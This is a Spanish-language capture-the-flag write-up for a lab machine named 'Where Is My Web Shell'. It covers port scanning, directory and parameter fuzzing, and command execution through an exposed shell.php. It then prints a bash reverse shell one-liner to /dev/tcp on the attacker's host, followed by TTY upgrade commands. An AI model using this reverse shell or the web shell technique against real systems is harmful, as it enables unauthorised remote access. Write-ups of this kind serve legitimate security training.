# MÁQUINA WHERE IS MY WEB SHELL

Lo primero que tendremos que hacer será realizar un escaneo de puertos a la máquina víctima usando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/Where%20Is%20My%20Web%20Shell/foto.jpg)

Únicamente está abierto el puerto 80, así que vamos a ver su contenido:

![WEB](https://github.com/Isma-yo/photos/blob/main/Where%20Is%20My%20Web%20Shell/foto2.jpg)

En el código fuente no hay nada extraño, sin embargo podemos ver que al final de la página nos dice que hay algo en el tmp, habrá que tenerlo en cuenta.

No podemos hacer nada más, así que vamos con el fuzzing web para ver directorios o ficheros hay por ahí:

```shell
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

![FUZZ](https://github.com/Isma-yo/photos/blob/main/Where%20Is%20My%20Web%20Shell/foto3.jpg)

Hay 2 página interesantes, la de warning.html y la de shell.php. Vamos a ver que hay en el html:

![HTML](https://github.com/Isma-yo/photos/blob/main/Where%20Is%20My%20Web%20Shell/foto4.jpg)

Nos esta dando una pista de que podemos hacer ejecución remota de comandos si conseguimos obtener el parámetro adecuado. Por lo que vamos a usar wfuzz para ver si encontramos el parámetro:

```shell
wfuzz -c -t 200 --hl=0 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=id"
```

![WFUZZ](https://github.com/Isma-yo/photos/blob/main/Where%20Is%20My%20Web%20Shell/foto5.jpg)

Y encontramos que ese parámetro del que nos hablaba era parameter, ahora que ya lo sabemos vamos a enviarnos una reverse shell para acceder a la máquina:

```shell
bash -c "bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261"
```

![BASH](https://github.com/Isma-yo/photos/blob/main/Where%20Is%20My%20Web%20Shell/foto6.jpg)

Ya estamos dentro, ahora tendremos que tratar la tty (terminal) con los siguientes comandos:

```shell
script /dev/null -c bash
```

```shell
Control Z
```

```shell
stty raw -echo; fg
```

```shell
reset xterm
```

```shell
export TERM=xterm
```

```shell
export SHELL=bash
```

```shell
stty rows 24 columns 126
```

Si nos acordamos nos habían dicho que en el directorio tmp había algo, por lo que vamos a ver que hay:

![ROOT](https://github.com/Isma-yo/photos/blob/main/Where%20Is%20My%20Web%20Shell/foto7.jpg)

Y ya somos root!









